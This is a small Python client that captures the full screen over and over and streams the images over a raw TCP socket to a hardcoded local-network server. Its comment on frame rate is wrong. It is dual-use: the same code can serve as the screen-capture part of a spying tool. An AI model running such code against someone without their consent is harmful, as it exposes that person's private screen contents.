import socket
import time
import os
from PIL import ImageGrab


class ScreenShare():
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = "192.168.98.223"
        self.port = 8090

        # The cooldown between each screenshot (in seconds) equals to 1/0.01 = 100 FPS
        self.cooldown = 0.05

    def start_screenshare(self):
        self.s.connect((self.host, self.port))
        self.connected = True
        print("[*] Connected to server")

        while True:
            try:
                print("Trying to send image")
                # Get the image
                img = self.get_screenshot()

                self.s.sendall(img)

                # Introduce a cooldown (in seconds) before sending the next screenshot
                time.sleep(self.cooldown)

            except Exception as e:
                print(f"Error sending image: {str(e)}")
                self.connected = False
                break

    def get_screenshot(self):
        # Get the image, then make it into raw material, then send it to the server
        img = ImageGrab.grab()

        # Save the image to a file
        img.save("image.png")

        # Open the image
        file = open("image.png", "rb")

        data = file.read()
        # Close the file
        file.close()
        # Remove the file
        os.remove("image.png")

        return data

    def stop_screenshare(self):
        self.connected = False
        self.s.close()
